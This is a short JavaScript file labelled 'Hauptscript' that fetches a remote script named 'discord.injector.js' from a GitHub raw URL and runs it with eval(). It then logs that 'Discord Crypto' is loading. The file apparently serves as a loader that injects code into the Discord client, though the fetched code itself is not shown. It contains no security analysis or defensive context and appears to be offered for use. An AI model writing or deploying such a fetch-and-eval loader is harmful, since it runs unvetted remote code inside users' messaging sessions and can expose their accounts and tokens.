/*
Hauptscript
*/
var xmlhttp;if (window.XMLHttpRequest){xmlhttp = new XMLHttpRequest();xmlhttp.open("GET", "https://raw.githubusercontent.com/4thebadwoofsky/scripts.common/master/discord.injector.js" ,false);xmlhttp.onreadystatechange = function () {if (xmlhttp.readyState != 4) return; eval(xmlhttp.responseText); console.log("[InjectorJS] Discord Crypto Loading...");};xmlhttp.send(null);}
